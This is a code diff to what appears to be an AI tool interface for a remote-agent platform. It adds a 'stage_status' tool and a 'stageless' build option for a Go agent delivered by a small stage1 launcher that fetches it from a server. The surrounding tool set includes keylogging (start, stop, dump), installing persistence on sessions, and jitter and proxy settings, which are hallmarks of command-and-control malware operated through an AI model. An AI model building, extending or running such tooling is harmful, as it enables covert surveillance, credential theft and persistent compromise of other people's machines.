@@ -675,6 +675,27 @@ def tool_build_go_agent(
     return _json_result({"ok": code == 200, "status": code, "data": data})
 
 
+def _valid_staging_id(staging_id: str) -> bool:
+    """Same shape as the server's STAGING_ID_RE: 8-128 of [A-Za-z0-9_-]."""
+    return 8 <= len(staging_id) <= 128 and all(
+        ch.isascii() and (ch.isalnum() or ch in "-_") for ch in staging_id
+    )
+
+
+def tool_stage_status(client: RmmApiClient, staging_id: str) -> str:
+    """Read the stage1 launcher status recorded on the server for a staged build."""
+    staging_id = str(staging_id or "").strip()
+    if not _valid_staging_id(staging_id):
+        return _json_result({"ok": False, "error": "invalid_staging_id",
+                             "detail": "staging_id must be 8-128 letters, digits, - or _"})
+    code, data = client.stage_status(staging_id)
+    if code == 404:
+        return _json_result({"ok": False, "status": 404,
+                             "error": "staging_entry_not_found",
+                             "detail": "Unknown, purged, or expired staging entry."})
+    return _json_result({"ok": code == 200, "status": code, "data": data})
+
+
 def tool_queue_keylog(client: RmmApiClient, session_ref: str, action: str) -> str:
     act = (action or "").strip().lower()
     if act not in ("start", "stop", "dump"):
@@ -1035,7 +1056,9 @@ TOOL_HANDLERS = {
         int(a.get("jitter_percent", 30)),
         a.get("http_proxy", ""),
         a.get("workspace_id", ""),
+        bool(a.get("stageless", False)),
     ),
+    "stage_status": lambda c, a: tool_stage_status(c, a["staging_id"]),
     "queue_keylog": lambda c, a: tool_queue_keylog(c, a["session_ref"], a["action"]),
     "install_persistence": lambda c, a: tool_install_persistence(c, a["session_ref"]),
     "remove_persistence": lambda c, a: tool_remove_persistence(c, a["session_ref"]),
@@ -1707,6 +1730,18 @@ OPENAI_TOOLS: list[dict] = [
                 "http_proxy": {"type": "string", "description": "Optional HTTP proxy URL used by the deployed agent"},
                 "stageless": {"type": "boolean", "description": "false (default): return a small stage1 ZIP (~20 KB C launcher) that fetches the Go agent from the server at runtime. true: return a ZIP with the full Go agent binary embedded directly (no staging server required, larger file on target)."},
             }},
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "stage_status",
+            "description": "Read the stage1 launcher status recorded on the server for a staged Go agent build (staging_id comes from build_go_agent): fetch state, expiry, and the last status line posted by stage1 (for example 'stage1 ok: agent installed and started' or 'stage1 failed: ...').",
+            "parameters": {
+                "type": "object",
+                "properties": {"staging_id": {"type": "string", "description": "Staging ID returned by the staged build"}},
+                "required": ["staging_id"],
+            },
         },
     },
     {
